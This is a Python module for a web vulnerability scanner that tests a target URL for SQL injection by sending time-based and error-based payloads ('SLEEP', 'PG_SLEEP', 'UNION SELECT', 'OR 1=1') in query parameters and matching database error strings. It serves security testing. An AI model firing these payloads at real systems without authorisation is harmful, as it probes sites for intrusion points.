import time
from typing import Optional

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScanTarget, Endpoint, Finding, ScannerManifest


ERROR_PATTERNS = [
    "sql syntax", "unclosed quotation", "mysql_fetch", "ora-", "sqlite",
    "postgresql", "odbc", "microsoft ole db", "warning: mysql",
    "division by zero", "unexpected token", "invalid query",
    "you have an error in your sql",
]

TIME_PAYLOADS = [
    ("1 AND SLEEP(3)", 2.5),
    ("1' AND SLEEP(3)--", 2.5),
    ("1 AND 1=(SELECT 1 FROM PG_SLEEP(3))", 2.5),
    ("1' AND 1=(SELECT 1 FROM PG_SLEEP(3))--", 2.5),
    ("1 AND BENCHMARK(5000000,MD5('test'))", 2.0),
    ("1' AND 1=1--", 0),
    ("1' AND 1=2--", 0),
]

ERROR_PAYLOADS = [
    "'", "\\", "\"", "';", "1'", "1'--", "' OR '1'='1", "' AND 1=1--",
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
]


@register_scanner(manifest=ScannerManifest(
    name="sqli_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=50,
    produces_tag_patterns=["sqli", "injection"],
))
class SQLIScanner(BaseScanner):
    @property
    def name(self) -> str:
        return "sqli_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list[Finding], list[Endpoint]]:
        findings: list[Finding] = []
        endpoints: list[Endpoint] = []

        for payload, min_delay in TIME_PAYLOADS:
            try:
                t0 = time.monotonic()
                resp = await self.request("GET", target.url, params={"id": payload, "q": payload})
                elapsed = time.monotonic() - t0
                if min_delay > 0 and elapsed >= min_delay:
                    findings.append(self.make_finding(
                        title="SQL Injection — Time-based",
                        description=f"Payload '{payload}' caused {elapsed:.1f}s delay (threshold {min_delay}s).",
                        severity="critical",
                        endpoint=self.make_endpoint(target.url, discovered_by=self.name),
                        evidence={"payload": payload, "delay_seconds": elapsed},
                        confidence=0.7,
                        tags=["sqli", "time-based", "blind"],
                    ))
            except Exception:
                pass

        for payload in ERROR_PAYLOADS:
            try:
                resp = await self.request("GET", target.url, params={"id": payload, "q": payload})
                body = resp.text.lower()
                matched = [p for p in ERROR_PATTERNS if p in body]
                if matched:
                    findings.append(self.make_finding(
                        title="SQL Injection — Error-based",
                        description=f"Payload '{payload}' triggered database error pattern: {matched}",
                        severity="high",
                        endpoint=self.make_endpoint(target.url, status_code=resp.status_code,
                                                     discovered_by=self.name),
                        evidence={"payload": payload, "error_patterns": matched,
                                  "body_snippet": body[:300]},
                        confidence=0.8,
                        tags=["sqli", "error-based"],
                    ))
            except Exception:
                pass

        return findings, endpoints
